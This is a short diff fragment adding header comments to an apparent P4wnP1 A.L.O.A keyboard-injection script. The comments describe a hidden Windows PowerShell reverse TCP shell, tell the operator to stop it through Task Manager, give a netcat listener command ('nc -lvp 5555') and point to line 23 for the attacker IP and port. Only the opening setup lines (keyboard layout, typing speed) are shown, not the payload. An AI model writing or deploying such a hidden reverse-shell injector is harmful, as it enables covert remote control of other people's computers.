@@ -1,3 +1,10 @@
+// simple windows powershell reverse tcp with P4wnP1 A.L.O.A
+// the windows powershell window will be hidden, look task manager to stop the connection
+//
+// listener with nc : nc -lvp 5555
+//
+// config ip & port : line 23
+
 layout('us');			// US keyboard layout
 
 typingSpeed(0,0)
